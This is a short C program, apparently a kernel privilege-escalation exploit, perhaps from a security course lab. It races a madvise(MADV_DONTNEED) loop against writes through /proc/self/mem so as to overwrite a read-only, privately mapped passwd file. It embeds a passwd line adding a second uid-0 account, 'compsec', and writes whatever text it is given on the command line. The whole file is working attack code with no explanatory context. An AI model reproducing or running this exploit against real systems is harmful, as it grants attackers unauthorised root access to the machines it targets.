#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>

void* map;
int f;
struct stat st;
char* name;

char passwd[] = "root:x:0:0:root:/root:/bin/bash\ncompsec:x:0:0:Compter Security,,,:/home/compsec:/bin/bash\n\r";
 
void* madviseThread(void *arg)
{
  char *str = (char*)arg;
  int i,c=0;

  for(i=0;i<100000000;i++)
    c+=madvise(map,100,MADV_DONTNEED);

  printf("madvise %d\n\n",c);
}
 
void* procselfmemThread(void *arg)
{
  char *str = (char*)arg;

  int f=open("/proc/self/mem",O_RDWR);
  int i,c=0;

  for(i=0;i<100000000;i++) {
    lseek(f,(uintptr_t) map,SEEK_SET);
    c+=write(f,str,strlen(str));
  }

  printf("procselfmem %d\n\n", c);
}
 
 
int main(int argc,char *argv[])
{
  pthread_t pth1,pth2;


  f=open("etc/passwd",O_RDONLY);
  fstat(f,&st);
  name="passwd";

  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
  printf("mmap %zx\n\n",(uintptr_t) map);


  pthread_create(&pth1,NULL,madviseThread,argv[1]);
  pthread_create(&pth2,NULL,procselfmemThread,argv[2]);
  pthread_join(pth1,NULL);
  pthread_join(pth2,NULL);
  return 0;
}